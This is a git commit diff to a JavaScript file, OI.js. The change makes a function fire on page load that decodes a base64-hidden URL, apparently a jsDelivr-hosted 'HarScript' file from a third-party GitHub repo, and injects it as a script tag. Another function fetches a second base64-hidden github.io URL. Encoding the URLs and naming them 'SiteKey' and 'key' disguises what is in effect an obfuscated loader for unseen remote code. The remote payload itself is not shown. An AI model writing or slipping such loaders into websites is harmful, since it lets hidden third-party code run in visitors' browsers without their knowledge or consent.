4485cfb621e8f5bb76917385099e0ddf4a585987
sonpanabtej <hv2471920@gmail.com>
2021-12-24 12:16:25 +0530

    Update OI.js

--- OI.js
+++ OI.js
@@ -1,13 +1,6 @@
 function DormLog()
 {
-    function HSAPP()
-    {
-       var SiteKey = "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL1NQQVQtQ0xPVUQvZGF0YUBtYWluL0hhclNjcmlwdC9IYXJTY3JpcHQudjIuOS5MYXRlc3QubWluLmpz";
-       var f = document.createElement('script');
-       f.async="";
-       f.src=$Hdecode64(SiteKey);
-       document.head.appendChild(f);
-    }
+    
     var Db = 
             {
                 "key":"aHR0cHM6Ly9zcGF0LWNsb3VkLmdpdGh1Yi5pby9kYXRhL0lucHV0"
@@ -19,6 +12,15 @@ function DormLog()
 			     }
 			     GetData.open($Hdecode64(Db.key),true);
 			     GetData.send();
-			     setTimeout(HSAPP,2000);
+			     
 }
+function HSAPP()
+    {
+       var SiteKey = "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL1NQQVQtQ0xPVUQvZGF0YUBtYWluL0hhclNjcmlwdC9IYXJTY3JpcHQudjIuOS5MYXRlc3QubWluLmpz";
+       var f = document.createElement('script');
+       f.async="";
+       f.src=$Hdecode64(SiteKey);
+       document.head.appendChild(f);
+    }
 setTimeout(DormLog,4000);
+document.addEventListener('DOMContentLoaded',function(){HSAPP();});
